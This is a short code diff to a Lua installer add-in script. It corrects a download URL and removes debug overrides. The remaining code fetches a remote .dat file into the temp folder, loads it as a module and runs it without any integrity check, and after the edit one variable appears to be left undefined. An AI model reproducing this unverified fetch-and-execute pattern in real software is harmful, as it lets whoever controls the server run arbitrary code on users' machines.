@@ -1,5 +1,5 @@
 
-local strServerLua = "http:/http://dl.52jsqx.com.com/update/1.0/dclsetupaddin_v1.1.dat"
+local strServerLua = "http://dl.52jsqx.com.com/update/1.0/dclsetupaddin_v1.1.dat"
 local strSetUpVer = "2"
 
 
@@ -955,16 +955,12 @@ function Main(strParam)
 	local strSavePath = apiUtil:GetSystemTempPath()
 	local strSaveName = GetFileSaveNameFromUrl(strServerLua)
 	strSavePath = apiUtil:PathCombine(strSavePath,strSaveName) 
-	--
-	strURLFix = "http://dl.aizhuomian.com/ldt/1.0/ldtinit.dat"
 	NewAsynGetHttpFile(strURLFix, strSavePath, false
 	, function(bRet, strRealPath)
 		Log("[Main] bRet:"..tostring(bRet)
 				.." strRealPath:"..tostring(strRealPath))
 				
 		if 0 == bRet then
-			--
-			strRealPath = "F:\\lvdun\\trunk\\adclean\\code\\ServerLua\\dclsetupaddin_v1.1.lua"
 			local tMod = XLLoadModule(strRealPath)
 			if type(tMod) == "table" and type(tMod.Run) == "function" then
 				local tDat = tMod.Run(strParam)
